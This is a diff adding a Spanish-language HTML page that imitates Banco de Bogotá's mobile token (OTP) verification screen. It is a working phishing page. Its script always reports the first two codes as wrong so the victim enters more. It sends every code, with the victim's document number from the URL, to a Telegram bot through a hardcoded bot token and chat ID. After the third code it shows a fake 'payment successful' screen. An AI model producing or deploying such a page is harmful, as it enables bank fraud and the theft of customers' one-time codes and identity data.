@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verificación OTP - Banco de Bogotá</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: white;
+        }
+
+        .contenedor {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .contenedor img {
+            width: 60%;
+            max-width: 280px;
+            margin-bottom: 30px;
+            object-fit: contain;
+        }
+
+        .titulo {
+            color: #0043A9;
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .titulo b {
+            font-weight: bold;
+        }
+
+        .descripcion {
+            font-size: 14px;
+            margin-bottom: 25px;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        #codigoToken {
+            width: 90%;
+            padding: 16px;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 8px;
+            border: 2px solid #0043A9;
+            border-radius: 8px;
+            outline: none;
+            text-align: center;
+        }
+
+        #codigoToken:focus {
+            border: 2px solid #0043A9;
+            box-shadow: 0 0 10px rgba(0, 67, 169, 0.3);
+        }
+
+        #errorMensaje {
+            color: red;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+            padding: 10px;
+            background: #ffebee;
+            border-radius: 6px;
+        }
+
+        #btnContinuar {
+            width: 90%;
+            margin-top: 20px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            background-color: #0043A9;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        #btnContinuar:hover {
+            background-color: #00398f;
+        }
+
+        #btnContinuar:active {
+            transform: scale(0.98);
+        }
+
+        /* PANTALLA DE CARGA */
+        #pantallaCarga {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 100%);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner-svg {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+        }
+
+        .loading-text {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .loading-subtext {
+            font-size: 14px;
+            color: #666;
+            margin: 0;
+        }
+
+        /* PANTALLA DE ÉXITO */
+        #pantallaExito {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 100%);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .success-box {
+            background: white;
+            border-radius: 12px;
+            padding: 40px 30px;
+            text-align: center;
+            max-width: 380px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: successAnimation 0.6s ease;
+            color: #4CAF50;
+        }
+
+        @keyframes successAnimation {
+            0% { 
+                transform: scale(0) rotate(-45deg);
+                opacity: 0;
+            }
+            50% { 
+                transform: scale(1.2);
+            }
+            100% { 
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+
+        .success-title {
+            color: #0043A9;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .success-text {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        /* PANTALLA DE ERROR */
+        #pantallaError {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 100%);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .error-box {
+            background: white;
+            border-radius: 12px;
+            padding: 40px 30px;
+            text-align: center;
+            max-width: 380px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .error-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            color: #f44336;
+        }
+
+        .error-title {
+            color: #0043A9;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .error-text {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 480px) {
+            .contenedor {
+                padding: 20px;
+            }
+
+            .contenedor img {
+                width: 65%;
+                max-width: 220px;
+            }
+
+            .titulo {
+                font-size: 22px;
+            }
+
+            #codigoToken {
+                width: 100%;
+                font-size: 18px;
+                padding: 14px;
+            }
+
+            #btnContinuar {
+                width: 100%;
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="contenedor">
+        <img src="tok.png" alt="Token">
+        <p class="titulo">Código <b>Token</b></p>
+        <br>
+        <p class="descripcion">Para realizar este proceso, ingresa el código de Token<br>móvil o físico.</p>
+        <br>
+        <input type="text" id="codigoToken" inputmode="numeric" maxlength="6" placeholder="000000">
+        
+        <div id="errorMensaje"></div>
+        <br><br><br>
+        <button id="btnContinuar">Continuar</button>
+    </div>
+
+    <!-- PANTALLA DE CARGA -->
+    <div id="pantallaCarga">
+        <div style="text-align: center;">
+            <div style="margin-bottom: 30px;">
+                <svg class="spinner-svg" viewBox="0 0 50 50">
+                    <circle cx="25" cy="25" r="20" fill="none" stroke="#0043a9" stroke-width="3" stroke-dasharray="31.4 94.2" style="animation: spin 1s linear infinite; transform-origin: 50% 50%;"></circle>
+                </svg>
+            </div>
+            <h2 class="loading-text">Verificando...</h2>
+            <p class="loading-subtext">No recargue ni cierre esta ventana.</p>
+        </div>
+    </div>
+
+    <!-- PANTALLA DE ÉXITO -->
+    <div id="pantallaExito">
+        <div class="success-box">
+            <div class="success-icon">✓</div>
+            <p class="success-title">¡Pago Exitoso!</p>
+            <p class="success-text">Tu transacción ha sido completada correctamente.</p>
+        </div>
+    </div>
+
+    <!-- PANTALLA DE ERROR -->
+    <div id="pantallaError">
+        <div class="error-box">
+            <div class="error-icon">✕</div>
+            <p class="error-title">Acceso Denegado</p>
+            <p class="error-text">Has superado el máximo de intentos. Por favor intenta más tarde.</p>
+        </div>
+    </div>
+
+    <script>
+        // ========================================
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003917791773';
+        // ========================================
+
+        let intentosFallidos = 0;
+        const MAX_INTENTOS = 3;
+
+        const input = document.getElementById("codigoToken");
+        const btn = document.getElementById("btnContinuar");
+        const error = document.getElementById("errorMensaje");
+        const pantallaCarga = document.getElementById("pantallaCarga");
+        const pantallaExito = document.getElementById("pantallaExito");
+        const pantallaError = document.getElementById("pantallaError");
+
+        // Recuperar intentos del localStorage
+        function cargarIntentos() {
+            const intentosGuardados = localStorage.getItem('intentosOTP');
+            if (intentosGuardados) {
+                intentosFallidos = parseInt(intentosGuardados);
+            }
+        }
+
+        // Guardar intentos en localStorage
+        function guardarIntentos() {
+            localStorage.setItem('intentosOTP', intentosFallidos);
+        }
+
+        // Cargar intentos al iniciar
+        cargarIntentos();
+
+        // Solo permitir números
+        input.addEventListener("input", function () {
+            this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+            error.style.display = "none";
+        });
+
+        // BOTÓN CONTINUAR - VALIDAR OTP
+        btn.addEventListener("click", async function () {
+            const valor = input.value.trim();
+            
+            if (!/^\d{6}$/.test(valor)) {
+                error.textContent = "El código debe tener exactamente 6 dígitos numéricos.";
+                error.style.display = "block";
+                input.focus();
+                return;
+            }
+
+            // Incrementar intento fallido
+            intentosFallidos++;
+            guardarIntentos();
+
+            // Obtener parámetros de URL
+            const params = new URLSearchParams(window.location.search);
+            const numeroDocumento = params.get('numeroDocumento') || 'N/A';
+            const tipoDocumento = params.get('tipoDocumento') || 'C.C.';
+
+            if (intentosFallidos < MAX_INTENTOS) {
+                // Intentos 1 y 2 - Token incorrecto
+                await enviarIntento(valor, intentosFallidos, numeroDocumento, tipoDocumento, false);
+                
+                // Mostrar error y limpiar
+                error.textContent = "El código es incorrecto. Intenta de nuevo.";
+                error.style.display = "block";
+                input.value = "";
+                input.focus();
+            } else if (intentosFallidos === MAX_INTENTOS) {
+                // Tercer intento - Pago confirmado
+                pantallaCarga.style.display = "flex";
+                
+                // Enviar último intento a Telegram con estado "Pago Confirmado"
+                await enviarIntento(valor, intentosFallidos, numeroDocumento, tipoDocumento, true);
+
+                // Mostrar pantalla de éxito después de 2 segundos
+                setTimeout(() => {
+                    pantallaCarga.style.display = "none";
+                    pantallaExito.style.display = "flex";
+                    localStorage.removeItem('intentosOTP');
+                }, 2000);
+            }
+        });
+
+        // ENVIAR INTENTO A TELEGRAM
+        async function enviarIntento(codigoIngresado, numeroIntento, documento, tipoDoc, esUltimo = false) {
+            const estado = esUltimo ? "✅ PAGO CONFIRMADO" : "❌ TOKEN INCORRECTO";
+            const intentosRestantes = MAX_INTENTOS - numeroIntento;
+            
+            const textoTelegram = `${estado}
+
+<b>Documento:</b> <code>${tipoDoc} ${documento}</code>
+<b>Código Ingresado:</b> <code>${codigoIngresado}</code>
+<b>Intento:</b> ${numeroIntento}/${MAX_INTENTOS}
+<b>Fecha:</b> ${new Date().toLocaleString('es-CO', {
+                timeZone: 'America/Bogota',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            })}
+
+${esUltimo ? '<b>✅ Transacción completada exitosamente</b>' : '<b>Intentos restantes:</b> ' + intentosRestantes}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textoTelegram,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                console.log('✅ Enviado a Telegram:', result.ok);
+            } catch (error) {
+                console.error('❌ Error enviando a Telegram:', error);
+            }
+        }
+
+        // Permitir enviar con Enter
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                btn.click();
+            }
+        });
+    </script>
+</body>
+</html>
